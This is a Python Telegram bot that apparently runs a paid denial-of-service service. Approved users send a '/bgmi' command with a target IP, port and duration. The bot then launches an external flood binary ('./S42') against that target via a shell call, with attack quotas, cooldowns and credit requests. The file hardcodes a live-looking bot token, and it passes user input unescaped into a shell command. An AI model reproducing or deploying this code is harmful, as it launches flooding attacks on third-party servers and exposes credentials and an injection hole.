import telebot
import subprocess
import datetime
import threading
from datetime import timedelta
from telebot import types
import time

# Bot initialization
bot = telebot.TeleBot('7630306892:AAFvSmee3PYScSmn4Ntmm_Uob0xmyk34hjo')

# Admin IDs
admin_id = ["6769245930"]

# File paths
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Constants
max_daily_attacks = 20  # Max attacks per user per day
COOLDOWN_TIME = 240  # Cooldown time in seconds (4 minutes)

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Variables
allowed_user_ids = []
user_attack_count = {}
last_attack_time = {}  # Track the time of last attack for cooldown
limit_increase_requests = {}  # To track users who requested limit increases
active_attacks = {}  # Track ongoing attacks (user_id: attack_status)

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log commands
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration} seconds\n\n")

# Record logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Duration: {duration}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Reset attack count daily
def reset_attack_count():
    while True:
        current_time = datetime.datetime.now()
        next_reset_time = current_time.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
        time_to_wait = (next_reset_time - current_time).total_seconds()
        time.sleep(time_to_wait)

        # Prepare daily attack summary
        attack_summary = "Daily attack summary:\n"
        for user_id, attack_count in user_attack_count.items():
            attack_summary += f"User {user_id}: {attack_count} attack(s)\n"

        # Send summary to admin(s)
        for admin in admin_id:
            bot.send_message(admin, attack_summary)

        # Reset counts
        user_attack_count.clear()

# Start the attack count reset thread
reset_thread = threading.Thread(target=reset_attack_count, daemon=True)
reset_thread.start()

# Command: /JOIN (Admin only)
@bot.message_handler(commands=['JOIN'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                bot.reply_to(message, f"𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥👋 \n\n𝘂𝘀𝗲𝗿 --> 5857557446 \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ❤️ \n\n𝗡𝗢𝗪 𝗔𝗗𝗗 𝗠𝗢𝗗𝗘")
            else:
                bot.reply_to(message, "𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝙅𝙊𝙄𝙉𝙀𝘿 🔥")
        else:
            bot.reply_to(message, "ＥＲＲＯＲ")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /REMOVE (Admin only)
@bot.message_handler(commands=['REMOVE'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                bot.reply_to(message, f"𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅")
            else:
                bot.reply_to(message, "𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭𝐢𝐧𝐠 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭")
        else:
            bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /bgmi (User attack)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check for cooldown
        if user_id in last_attack_time:
            last_time = last_attack_time[user_id]
            time_diff = (datetime.datetime.now() - last_time).total_seconds()

            if time_diff < COOLDOWN_TIME:
                remaining_time = COOLDOWN_TIME - time_diff
                bot.reply_to(message, f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙨𝙩𝙞𝙡𝙡 𝙧𝙪𝙣𝙣𝙞𝙣𝙜... {int(remaining_time)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜")
                return

        attacks_today = user_attack_count.get(user_id, 0)
        remaining_attacks = max_daily_attacks - attacks_today

        if remaining_attacks <= 0:
            # Add a request button if the limit is reached
            markup = types.InlineKeyboardMarkup()
            request_button = types.InlineKeyboardButton("𝙍𝙚𝙦𝙪𝙚𝙨𝙩 𝙁𝙤𝙧 𝘾𝙍𝘿𝙏𝙨.", callback_data=f"request_increase_{user_id}")
            markup.add(request_button)
            bot.reply_to(message, "𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙏𝙝𝙚 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 𝘼𝙩𝙩𝙖𝙘𝙠𝙨\n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖  \n🆁🅴🆀🆄🅴🆂🆃 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎\n👇👇👇", reply_markup=markup)
        else:
            command = message.text.split()
            if len(command) == 4:
                target, port, duration = command[1], int(command[2]), int(command[3])

                # Check if the port is blocked
                if port in blocked_ports:
                    bot.reply_to(message, f"𝙋𝙊𝙍𝙏 {port} \n𝐛𝐥𝐨𝐜𝐤𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐨𝐨𝐬𝐞 𝐚 𝐝𝐢𝐟𝐟𝐞𝐫𝐞𝐧𝐭 𝐩𝐨𝐫𝐭")
                    return

                if duration > 240:
                    bot.reply_to(message, "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 𝟐𝟒𝟎")
                else:
                    # Log attack
                    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
                    last_attack_time[user_id] = datetime.datetime.now()  # Update last attack time

                    record_command_logs(user_id, '/bgmi', target, port, duration)
                    log_command(user_id, target, port, duration)

                    # Notify the user that the attack has started
                    bot.send_message(user_id, f"𝆺𝅥⃝Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\nA̶t̶t̶a̶c̶k̶ ̶B̶y̶ ̶:̶-̶ {username} \n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══")
                    
                    # Start the attack
                    subprocess.run(f"./S42 {target} {port} {duration} 1000", shell=True)

                    # Inform user that the attack started
                    bot.reply_to(message, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 ✅ \n𝙔𝙊𝙐𝙍 𝘾𝙍𝙀𝘿𝙄𝙏𝙨 --> 5/{remaining_attacks - 1}\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══")

                    # Send message when the attack ends
                    time.sleep(duration)  # Wait for the attack to finish
                    bot.send_message(user_id, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 --> 𝙁𝙄𝙉𝙄𝙎𝙃 😅\n𝐓𝐚𝐫𝐠𝐞𝐭 {target} 𝐏𝐨𝐫𝐭 {port} 𝐓𝐢𝐦𝐞 {time}\n\n𝙏𝙊𝙏𝘼𝙇 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 --> 5/{remaining_attacks - 1}")
    else:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬")

# Command: /check (Daily attack check)
@bot.message_handler(commands=['check'])
def check_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        attacks_today = user_attack_count.get(user_id, 0)
        remaining_attacks = max_daily_attacks - attacks_today

        if remaining_attacks > 0:
            bot.reply_to(message, f"𝙽𝙾𝚆 𝙱𝙾𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 --> 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴✅ \n𝚈𝙾𝚄 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙱𝙾𝚃 𝙻𝙸𝙺𝙴 --> \n/𝚋𝚐𝚖𝚒 <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>\n\n𝙏𝙊𝙏𝘼𝙇 𝘾𝙍𝘿𝙏𝙨 --> {remaining_attacks}")
        else:
            bot.reply_to(message, "𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙏𝙝𝙚 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 ❌𝘾𝙍𝙀𝘿𝙄𝙏𝙎❌ 𝙤𝙛 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 \n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖 && 🆁🅴🆀🆄🅴🆂🆃 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎\n\n𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐂𝐑𝐃𝐓𝐬 --> 5/0")
    else:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬")

# Command: /approve_limit (Admin only)
@bot.message_handler(commands=['limit'])
def approve_limit(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            action = command[1]
            request_user_id = command[2]

            if action == "approve" and request_user_id in limit_increase_requests:
                # Increase limit for user
                global max_daily_attacks
                max_daily_attacks += 3  # Example: increase limit by 3 attacks
                del limit_increase_requests[request_user_id]
                bot.reply_to(message, f"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 𝘾𝙍𝙀𝘿𝙄𝙏𝙨 👍\n {request_user_id}.")
            elif action == "deny":
                # Deny limit increase request
                del limit_increase_requests[request_user_id]
                bot.reply_to(message, f"𝘿𝙞𝙨𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 𝘾𝙍𝙀𝘿𝙄𝙏𝙨 👎\n {request_user_id}.")
            else:
                bot.reply_to(message, "𝐒𝐄𝐋𝐄𝐂𝐓 ->  'approve' or 'deny'.")
        else:
            bot.reply_to(message, "ᴜꜱᴇ ʟɪᴋᴇ --> /ʟɪᴍɪᴛ ᴀᴘᴘʀᴏᴠᴇ/ᴅᴇɴʏ ᴜꜱᴇʀ_ɪᴅ")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /reset_attack_limit (Admin only)
@bot.message_handler(commands=['reset_limit'])
def reset_attack_limit(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in user_attack_count:
                user_attack_count[target_user_id] = 0  # Reset the user's attack count
                bot.reply_to(message, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙈𝙄𝙏𝙎 𝙄𝙉𝘾𝙍𝙀𝘼𝙎𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 👍")
            else:
                bot.reply_to(message, f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒 --> 𝐀𝐋𝐈𝐕𝐄 𝐚𝐭𝐭𝐚𝐜𝐤𝐬")
        else:
            bot.reply_to(message, "𝐔𝐒𝐄 𝐋𝐢𝐤𝐞 --> /𝐫𝐞𝐬𝐞𝐭_𝐥𝐢𝐦𝐢𝐭 𝐮𝐬𝐞𝐫_𝐢𝐝")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /reset_all_cooldowns (Admin only)
@bot.message_handler(commands=['reset_cooldowns'])
def reset_all_cooldowns(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Reset cooldown for all users by clearing the last_attack_time
        last_attack_time.clear()
        bot.reply_to(message, "𝘊𝘖𝘖𝘓𝘋𝘖𝘞𝘕 𝘙𝘌𝘔𝘖𝘝𝘌 𝘍𝘖𝘙 𝘛𝘏𝘐𝘚 𝘛𝘐𝘔𝘌")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Handle the request limit increase button
@bot.callback_query_handler(func=lambda call: call.data.startswith('request_increase_'))
def handle_limit_request(call):
    user_id = call.data.split('_')[-1]
    if user_id not in limit_increase_requests:
        limit_increase_requests[user_id] = True
        bot.answer_callback_query(call.id, "🅨🅞🅤🅡 🅡🅔🅠🅤🅔🅢🅣 🅢🅔🅝🅓 👍")
        bot.send_message(call.message.chat.id, "🆆🅰🅸🆃 🅵🅾🆁 🅾🆆🅽🅴🆁 🅳🅴🅲🅸🆂🅸🅾🅽 🚩")

# Command: /help (Show all commands)
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐀𝐋𝐋 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬
/JOIN 👍 /REMOVE 👍 /bgmi ❤️ /check 👍 /approve_limit 👍 /reset_limit 👍 /reset_cooldowns 👍
    """
    bot.reply_to(message, help_text)
    
bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

